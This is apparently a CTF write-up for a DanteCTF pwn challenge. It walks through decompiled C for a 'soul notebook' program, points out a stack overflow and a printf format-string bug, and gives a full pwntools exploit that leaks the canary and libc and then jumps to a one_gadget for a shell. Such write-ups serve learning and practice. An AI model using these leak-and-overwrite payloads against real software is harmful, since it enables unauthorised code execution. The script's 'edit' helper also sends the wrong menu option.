This challenge is a bit harder. its pretty big and it has the following functionllity:

you can do 5 things:
```
[1] Insert a new soul
[2] Remove a soul
[3] Edit a soul
[4] View a soul
[5] Exit
```

lets view the code of each function:

```c
unsigned __int64 add_soul()
{
  int pos; // [rsp+0h] [rbp-40h]
  int circle; // [rsp+4h] [rbp-3Ch]
  struct_dest *dest; // [rsp+8h] [rbp-38h]
  char src[32]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(src, 0, sizeof(src));
  printf("Notebook position [1-5]: ");
  pos = read_int() - 1;
  if ( pos >= 0 && pos <= 4 )
  {
    if ( souls[pos] )
    {
      puts("Invalid slot!\n");
    }
    else
    {
      dest = (struct_dest *)malloc(0x44uLL);
      if ( !dest )
      {
        puts("Error!\n");
        _exit(1);
      }
      printf("Soul name: ");
      read_string(src, 0x20uLL);
      if ( src[0] )
      {
        strncpy(dest->name, src, 0x20uLL);
        printf("Circle where I found him/her [1-9]: ");
        circle = read_int();
        if ( circle > 0 && circle <= 9 )
        {
          dest->circle = circle;
          memset(src, 0, sizeof(src));
          printf("When I met him/her [dd/Mon/YYYY]: ");
          read_string(src, 0x60uLL);
          if ( strlen(src) != 11 && !sanitize_date(src) )
          {
            puts("Invalid date!\n");
            _exit(1);
          }
          strncpy(dest[1].name, src, 12uLL);
          souls[pos] = dest;
          puts("Soul registered!");
        }
        else
        {
          puts("Invalid circle!\n");
        }
      }
      else
      {
        puts("Invalid name!\n");
      }
    }
  }
  else
  {
    puts("Invalid position!\n");
  }
  return v5 - __readfsqword(0x28u);
}

int remove_soul()
{
  int pos; // [rsp+Ch] [rbp-4h]

  printf("Notebook position [1-5]: ");
  pos = read_int() - 1;
  if ( pos < 0 || pos > 4 )
    return puts("Invalid position!\n");
  if ( !souls[pos] )
    return puts("Invalid slot!\n");
  free((void *)souls[pos]);
  souls[pos] = 0LL;
  return puts("Soul removed!");
}

unsigned __int64 view_soul()
{
  int v1; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Notebook position [1-5]: ");
  v1 = read_int() - 1;
  if ( v1 >= 0 && v1 <= 4 )
  {
    if ( souls[v1] )
    {
      printf("Soul name: %s\nCircle: %d\nMeeting date: ", (const char *)souls[v1], *(unsigned int *)(souls[v1] + 32LL));
      printf((const char *)(souls[v1] + 36LL));
      puts("\nSoul shown!");
    }
    else
    {
      puts("Invalid slot!\n");
    }
  }
  else
  {
    puts("Invalid position!\n");
  }
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 edit_soul()
{
  int v1; // [rsp+8h] [rbp-38h]
  int v2; // [rsp+Ch] [rbp-34h]
  char src[8]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v4; // [rsp+18h] [rbp-28h]
  __int64 v5; // [rsp+20h] [rbp-20h]
  __int64 v6; // [rsp+28h] [rbp-18h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  *(_QWORD *)src = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  printf("Notebook position [1-5]: ");
  v1 = read_int() - 1;
  if ( v1 >= 0 && v1 <= 4 )
  {
    if ( souls[v1] )
    {
      printf("Soul name: ");
      read_string(src, 0x20uLL);
      if ( src[0] )
      {
        strncpy((char *)souls[v1], src, 0x20uLL);
        printf("Circle where I found him/her [1-9]: ");
        v2 = read_int();
        if ( v2 > 0 && v2 <= 9 )
        {
          *(_DWORD *)(souls[v1] + 32LL) = v2;
          printf("When I met him/her [dd/Mon/YYYY]: ");
          read_string(src, 0xCuLL);
          if ( strlen(src) != 11 && !sanitize_date(src) )
          {
            puts("Invalid date!\n");
            _exit(1);
          }
          strncpy((char *)(souls[v1] + 36LL), src, 0x20uLL);
          puts("Soul updated!");
        }
        else
        {
          puts("Invalid circle!\n");
        }
      }
      else
      {
        puts("Invalid name!\n");
      }
    }
    else
    {
      puts("Invalid slot!\n");
    }
  }
  else
  {
    puts("Invalid position!\n");
  }
  return v7 - __readfsqword(0x28u);
}
```

First of all, the binary is compiled with full mitagtions. So stack canary is enabled.
Now lets go over the bugs in this program:
1. when creating a new soul, we can make our Month to be whatever we want. (and not just Feb,Jan, etc.)
2. buffer overflow when reading the date from the user.

![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/4c8d2643-022b-4624-874e-51d1db183f89)

the `read_string` function is using read to read the input, which doesn't stops at null bytes.
This means an attacker can write a null byte as the twelve byte, and continue writing to the buffer and overwriting the return pointer.

3. The view_soul functionllity has a FSB:
```c
  printf("Soul name: %s\nCircle: %d\nMeeting date: ", (const char *)souls[v1], *(unsigned int *)(souls[v1] + 32LL));
  printf((const char *)(souls[v1] + 36LL));
  ```
  
  it basiclly prints the date varible we can provide, which can give us leaks.
  
  Exploition:
  
  Our idea would be to leak the stack canary and libc using the fsb, and then just a classic one_gadget call.
  
  I saw that the canary is 9 bytes after the addresses given in the fsb, so '%9$p: aaaaa\x00' would be it. (remember we need to make strlen to be 11)
  And by doing the same to the libc, I saw that a libc address is located 15 bytes after.
  Now we basiclly have our leaks:
  
  ```py
leak_canary_chunk = insert(1, 'A' * (0x20-1), 1, b'%9$p: aaaaa\x00')
leak = view(leak_canary_chunk)
canary = extract_fsb_leak(leak)


leak_libc_chunk = insert(3, 'C' * (0x20-1), 1, b'%15$p: aaaa\x00')
leak = view(leak_libc_chunk)
libc_leak = extract_fsb_leak(leak)

libc.address = libc_leak - 0x29d90
```

Now we just need to use our buffer overflow bug, and jump to our one_gadget!
```
bof_chunk = insert(2, 'E' * (0x20 - 1), 2, b'B'*11+b'\x00'*29 + p64(canary) + p64(0) + p64(0x50a37+libc.address))
```

I really enjoyed this challenge, cause I really speed ran it :) (got the first blood here aswell)

Full exploit:

```py
from pwn import *

e = ELF('./bin')
#p = gdb.debug('./bin')
p = remote('challs.dantectf.it', 31530)
libc = ELF('libc.so.6')
def insert(pos, name, circle, date):
	p.sendline("1")
	p.recvuntil(': ')
	p.sendline(str(pos))
	p.recvuntil(': ')
	p.sendline(name)
	p.recvuntil(': ')
	p.sendline(str(circle))
	p.recvuntil(': ')
	p.sendline(date)
	print(p.recv())
	return pos 

def remove(pos):
	p.sendline("2")
	p.recvuntil(': ')
	p.sendline(str(pos))
	print(p.recv())

def edit(pos):
	p.sendline("2")
	p.recvuntil(': ')
	p.sendline(str(pos))
	print(p.recv())

def view(pos):
	p.sendline("4")
	p.recvuntil(': ')
	p.sendline(str(pos))
	return p.recv()

def extract_fsb_leak(leak):
	return int(leak.split(b'\n')[2].split(b": ")[1], 16)

p.recvuntil('> ')

leak_canary_chunk = insert(1, 'A' * (0x20-1), 1, b'%9$p: aaaaa\x00')
leak = view(leak_canary_chunk)
canary = extract_fsb_leak(leak)


leak_libc_chunk = insert(3, 'C' * (0x20-1), 1, b'%15$p: aaaa\x00')
leak = view(leak_libc_chunk)
libc_leak = extract_fsb_leak(leak)

libc.address = libc_leak - 0x29d90

print(hex(canary), hex(e.address), hex(libc.address))

bof_chunk = insert(2, 'E' * (0x20 - 1), 2, b'B'*11+b'\x00'*29 + p64(canary) + p64(0) + p64(0x50a37+libc.address))
p.interactive()
```

  
